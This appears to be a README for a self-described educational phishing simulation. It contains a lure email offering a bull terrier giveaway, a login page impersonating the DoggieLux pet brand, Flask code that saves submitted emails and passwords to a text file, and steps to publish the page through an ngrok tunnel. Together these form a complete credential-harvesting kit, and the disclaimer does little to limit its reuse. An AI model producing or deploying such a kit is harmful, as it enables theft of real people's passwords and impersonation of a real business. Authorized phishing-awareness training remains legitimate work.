# Phishing Website Simulation Project

## **Overview** 🐟
This project is a hilarious take on creating a simulated phishing website for educational purposes. Think of it as a "phish-tastic" journey where we pretend to be sneaky (but ethical) hackers! The goal was to design a convincing phishing email and website to simulate a real-world phishing scenario, but without being evil. 😈 This is strictly for cybersecurity laughs and learning, folks!

---

## **Tools and Technologies Used** 🛠️

### **1. Tools and Software**:
- **Flask (Python Framework):** Because plain old HTML just wouldn't cut it for our master plan.
- **Ngrok:** The magical tunnel that makes our local Flask app appear on the internet. It's like Hogwarts for developers.
- **Visual Studio Code:** The trusty text editor that didn't crash (much) during this project.

### **2. Websites Referenced:**
- **DoggieLux Website (https://www.doggieluxe.com/):** For that authentic "we're totally not scamming you" vibe.

### **3. File Hosting:**
- **Local Environment:** Because the internet can't handle how cool our files are.

---

## **Project Steps**

### **Step 1: Setting Up the Environment** ⚙️
1. Installed Python dependencies:
   ```bash
   pip install flask
   ```
2. Created a virtual environment to keep our chaos contained:
   ```bash
   python3 -m venv myenv
   source myenv/bin/activate
   ```

---

### **Step 2: Designing the Phishing Email** ✉️

#### **Email Content:**
We whipped up an email so charming, even Bob couldn't resist. Here's how it went:

```markdown
Subject: 🐾 Don’t Miss Out, Bob! Bull Terrier Giveaway Ends Soon! 🐾

Body:
Hi Bob,

We know how much you adore bull terriers—so we’ve teamed up with [DoggieLux](https://www.doggie***.com/) to bring you something special!

🎉 **Exclusive Giveaway for Bull Terrier Lovers** 🎉

Enter now for a chance to win one of these amazing prizes:
- 🩴 **Premium Bull Terrier Care Package**
- 🐕 **Custom Merchandise Featuring Your Dog's Name**
- 🛍️ **A $100 Gift Card for Pet Supplies**

**[Click Here to Enter the Giveaway Now!](https://3fd6-91-178-64-***.ngrok-free.app)**

🕓 **Hurry—Entries Close in 48 Hours!**

Warm regards,  
The Bull Terrier Community Team  
🐾 We ❤️ Bull Terriers!
```

---

### **Step 3: Building the Phishing Website** 🌐

> **Note:** When testing, do not use your real email or password! This is a simulation, so make up fake credentials for safety and fun.

#### **1. Flask Application (Backend):**
The backend for handling form submissions was created using Flask, because "backend" sounds fancy.

**app.py:**
```python
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')
    with open('credentials.txt', 'a') as file:
        file.write(f'Username: {username}, Password: {password}\n')
    return render_template('thank_you.html')

if __name__ == '__main__':
    app.run(debug=True)
```

---

#### **2. HTML and CSS (Frontend):**
- Designed a website so cute, even a bull terrier would click "Register."
- Key elements:
  - `index.html` for the main page.
  - `thank_you.html` for the "You fell for it!" page.

**index.html:**
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bull Terrier Giveaway</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>
<body>
    <div class="container">
        <header>
            <h1>🐾 Bull Terrier Lovers Giveaway 🐾</h1>
        </header>
        <main>
            <img src="{{ url_for('static', filename='dog.jpg') }}" alt="Bull Terrier" class="decorative-image">
            <p>Welcome to the ultimate giveaway for Bull Terrier lovers! Enter your details below for a chance to win:</p>
            <ul>
                <li>A premium Bull Terrier care package 🩴</li>
                <li>Custom Bull Terrier merchandise 🐕</li>
                <li>A $100 gift card for pet supplies 🛍️</li>
            </ul>
            <form action="/submit" method="POST">
                <label for="username">Your Email:</label>
                <input type="text" id="username" name="username" placeholder="Enter your email" required>

                <label for="password">Create a Password:</label>
                <input type="password" id="password" name="password" placeholder="Enter a secure password" required>

                <button type="submit">Join the Giveaway</button>
            </form>
        </main>
        <footer>
            <p>🐶 We ❤️ Bull Terriers! | Powered by DoggieLux</p>
        </footer>
    </div>
</body>
</html>
```

**styles.css:**
Because plain text isn't exciting, we styled it up with a bull terrier-inspired theme. Key highlights include:
- Centered layout.
- Colors that scream, "Trust us, we're totally legit."

---

### **Step 4: Testing with Ngrok** 🚀
1. Installed Ngrok to expose the local Flask app to the world:
   ```bash
   ngrok http 5000
   ```
2. Shared the magical Ngrok URL (e.g., `https://3fd6-91-178-64-150.ngrok-free.app`) in the phishing email. It worked like a charm.

---

## **Outcome** 🎯
- The website successfully captured form submissions and stored credentials in `credentials.txt`.
- We laughed, we learned, and no real users were harmed in the making of this simulation.

---

## **Disclaimer** ⚠️
This project is strictly for educational purposes. The techniques demonstrated here must not be used for malicious or unethical purposes. Always seek permission and follow ethical guidelines when simulating phishing scenarios.

---

Enjoy the project! And remember, not every email is as innocent as it seems—stay alert for phishing attempts! 😉🔎
